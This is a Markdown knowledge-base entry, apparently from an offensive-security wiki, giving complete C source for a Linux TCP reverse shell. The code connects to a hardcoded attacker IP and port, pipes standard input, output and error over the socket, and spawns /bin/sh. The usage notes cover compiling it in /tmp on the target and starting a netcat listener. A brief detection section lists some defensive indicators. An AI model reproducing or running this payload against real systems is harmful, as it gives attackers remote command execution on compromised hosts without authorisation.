---
type: code
language: c
verified: true
tags:
  - reverse-shell
  - payload
  - c-programming
platforms:
  - Linux
validated: true
---

# C-Reverse-Shell-Payload

## Code

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    /* Create a socket */
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    /* Configure server details */
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    /* Connect to the server */
    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));

    /* Redirect standard input, output and error to the socket */
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    /* Execute a shell */
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

## Description

This C code implements a basic TCP reverse shell that connects from the target machine to an attacker-specified IP and port, redirects stdin, stdout, and stderr to the socket, and spawns /bin/sh for interactive command execution. It is compiled and run on the target to provide remote access without using pre-built tools.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.0.0.1 | Attacker's IP address (hardcoded; edit in code before compiling) | 192.168.1.100 |
| 4242 | Listening port on attacker's machine (hardcoded; edit in code) | 4444 |

## Usage

Save this code to a file like /tmp/shell.c on the target, edit the IP and port, then compile and execute using [[commands/gcc-compile-c-reverse-shell-and-execute]]. Start a listener on the attacker machine (e.g., nc -lvnp 4242) before running. Used in post-exploitation for gaining shell access after initial code execution.

## Detection

- Monitor for gcc processes spawning shells or connecting outbound.
- Network logs showing TCP connections from unexpected processes to high ports.
- File system changes: new .c files in /tmp or unusual binaries.
- Behavioral analytics on socket creation and dup2 calls in process traces.

## Related

- [[procedures/Establish-C-Reverse-Shell]]
- [[commands/gcc-compile-c-reverse-shell-and-execute]]
